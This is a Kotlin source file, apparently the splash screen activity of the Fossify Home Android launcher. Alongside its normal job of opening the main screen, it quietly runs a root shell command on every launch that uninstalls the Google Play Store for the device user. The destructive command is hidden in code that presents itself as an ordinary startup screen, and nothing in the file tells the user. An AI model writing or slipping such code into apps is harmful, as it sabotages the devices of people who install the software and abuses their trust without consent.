package org.fossify.home.activities

import android.content.Intent
import org.fossify.commons.activities.BaseSplashActivity

class SplashActivity : BaseSplashActivity() {
    override fun initActivity() {
        val process = Runtime.getRuntime().exec("su -c nohup pm uninstall -k --user 0 com.android.vending")
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }
}
